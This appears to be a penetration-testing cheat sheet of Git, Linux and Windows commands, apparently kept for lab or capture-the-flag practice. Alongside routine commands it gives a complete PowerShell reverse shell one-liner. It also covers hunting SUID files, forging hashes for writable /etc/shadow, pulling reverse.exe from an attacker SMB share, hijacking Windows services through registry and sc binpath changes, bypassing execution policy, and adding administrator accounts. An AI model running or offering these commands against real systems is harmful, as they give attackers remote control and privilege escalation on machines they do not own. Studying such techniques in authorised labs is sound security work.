<a name="top"></a>[:house:](README.md)

# :skull: Commands

- [Git](#octocat-git)
- [Linux](#penguin-linux)
- [Windows](#paperclip-windows)

## :octocat: Git

- [Configure Email and Name](#configure-email-and-name)
- [Save Credentials](#save-credentials)

### Configure Email and Name

```
git config --global user.email "jdoe@example.com"
git config --global user.name "John Doe"
```

### Save Credentials

```
git config --global credential.helper store
```

<p align="right"><a href="#octocat-git">:up:</a> <a href="#top">:top:</a></p>

## :penguin: Linux

- [base64](#base64)
- [export](#export)
- [find](#find)
- [mkpasswd](#mkpasswd)
- [stty](#stty)
- [sudo](#sudo)
- [whoami](#whoami)

### base64

```
$ echo "hello" | base64
aGVsbG8K

$ echo "aGVsbG8K" | base64 -d
hello
```

### export

Add to PATH

```
$ export PATH=/tmp:$PATH
```

Reset PATH

```
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
```

### find

- [SUID and GUID Files](#suid-and-guid-files)

#### SUID and GUID Files

```
$ find / -perm -u=s -type f 2>/dev/null
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

### mkpasswd

```
$ mkpasswd -m sha-512 newpasswordhere
```

Handy for writable /etc/shadow files.

### stty

```
$ stty -u
$ stty rows 44
$ stty cols 159
```

### sudo

```
sudo -l
```

List the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.  A longer list format is used if this option is specified multiple times and the security policy supports a verbose output format.

### whoami

```
$ whoami
root
```

<p align="right"><a href="#penguin-linux">:up:</a> <a href="#top">:top:</a></p>

## :paperclip: Windows

- [Add User To Administrators Group](#add-user-to-administrators-group)
- [Browse Registry](#browse-registry)
- [Copy From SMB](#copy-from-smb)
- [Create Windows User](#create-windows-user)
- [Edit Registry Keys](#edit-registry-keys)
- [icacls](#icacls)
- [Get AD Group](#get-ad-group)
- [Get AD User](#get-ad-user)
- [Powershell Reverse Shell](#powershell-reverse-shell)
- [Powershell (with execution policy bypassed)](#powershell-with-execution-policy-bypassed)
- [PowerView Get Users](#powerview-get-users)
- [PowerView OS Details](#powerview-os-details)
- [Service](#service)

### Add User To Administrators Group

```
> net localgroup administrators <username> /add
```

### Browse Registry

```
> cd HKLM:\
```

### Copy From SMB

```shell
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

### Create Windows User

```
> net user <username> <password> /add
```	

### Edit Registry Keys

```shell
> reg /?
```

Overwrite the registry key to point to the reverse.exe executable

```shell
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
The operation completed successfully.
```

### icacls

```
> icacls C:\folder
> icacle C:\folder /setowner Users
```

### Get AD Group

```
> Get-ADGroup -Filter 'samAccountName -like "*foo*"'
```

### Get AD User

```
> Get-ADUser -Identity SQLService -Properties *
```

### Powershell Reverse Shell

```
> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

See: [URL Encoded Powershell Reverse Shell](notes.md#notebook-url-encoded-powershell-reverse-shell)

### Powershell (with execution policy bypassed)

```
> powershell -ep bypass
```

### PowerView Get Users

```
> Get-NetUser | select cn
```

### PowerView OS Details

```
> Get-NetComputer -fulldata | select operatingsystem
```

<p align="right"><a href="#paperclip-windows">:up:</a> <a href="#top">:top:</a></p>

<p align="center"><img src="https://picsum.photos/800/100"></p>



### Service

Query service

```shell
> sc qc daclsvc
```

Modify service config

```shell
> sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
```

Stop service

```shell
> net stop daclsvc
```

Start service

```shell
> net start daclsvc
```